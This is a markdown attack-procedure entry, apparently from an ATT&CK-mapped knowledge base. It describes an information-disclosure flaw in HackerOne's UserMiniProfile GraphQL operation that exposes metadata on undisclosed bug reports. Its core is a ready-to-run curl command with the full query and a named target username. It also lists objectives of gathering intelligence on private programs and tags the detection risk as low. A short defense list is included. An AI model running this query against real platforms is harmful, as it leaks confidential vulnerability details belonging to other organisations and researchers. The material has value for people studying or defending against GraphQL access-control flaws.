---
id: proc-uuid-001
name: Query-GraphQL-UserMiniProfile-for-Retest-Metadata
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.385Z'
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - information-disclosure
  - graphql
  - api-query
commands:
  - '[[commands/graphql-user-miniprofile-query]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: low
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Query-GraphQL-UserMiniProfile-for-Retest-Metadata

## Summary

This procedure sends a GraphQL query to HackerOne's API to fetch a user's mini profile, specifically targeting the report_retests field to retrieve metadata on retested reports, including those that are undisclosed.

## Description

In the context of testing HackerOne's platform, this procedure exploits a lack of access controls in the UserMiniProfile GraphQL operation. By querying the report_retests object within the User node, attackers can obtain sensitive details like asset names, types, severity ratings, and weakness names for reports where the full report is not disclosed (indicated by 'report': null). This is useful for reconnaissance on private bug bounty programs and vulnerability trends without needing authentication. Prerequisites include public access to the HackerOne domain and knowledge of a target username.

## Requirements

1. Internet access to https://hackerone.com/graphql
2. A target username (e.g., from public HackerOne profiles)
3. HTTP client like curl for sending POST requests

## Defense

Defensive measures and detection strategies:

- Implement proper access controls on GraphQL resolvers to filter report_retests based on disclosure status
- Rate-limit unauthenticated GraphQL queries to prevent abuse
- Monitor API logs for repeated UserMiniProfile queries targeting report_retests

## Objectives

1. Retrieve user profile data including retest metadata
2. Identify undisclosed reports through null 'report' fields
3. Gather intelligence on assets and vulnerabilities in private programs

## Instructions

### Step 1: Prepare and Send GraphQL Query

**Context**: Construct and execute the POST request to the GraphQL endpoint with the UserMiniProfile operation, including the fragment that fetches detailed report_retests fields.

**Command** ([[commands/graphql-user-miniprofile-query]]):
```bash
curl -X POST https://hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"operationName":"UserMiniProfile","variables":{"username":"msdian7"},"query":"query UserMiniProfile($username: String!) {\n  user(username: $username) {\n    id\n    ...UserMiniProfileLayout\n    __typename\n  }\n}\n\nfragment UserMiniProfileLayout on User {\n  id\n  large_profile_picture: profile_picture(size: large)\n  name\n  username\n  bio\n  reputation\n  signal\n  report_retests{total_count,approved_count,nodes{report{_id},created_at,asset_name,asset_type,award_amount,claimed_at,report_state,weakness_name,severity_rating,report_substate,report_retest_users{total_count,nodes{_id,user{username},state,invitation{id}}}}}\n  cleared\n  __typename\n}"}'
```

> This command sends the query with variables specifying the username. Expected output is a JSON response under 'data.user' with 'report_retests' containing total_count, approved_count, and nodes array with retest details.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/graphql-user-miniprofile-query]]

## Tools Used


## Tags

- [[information-disclosure]]
- [[graphql]]
- [[api-query]]
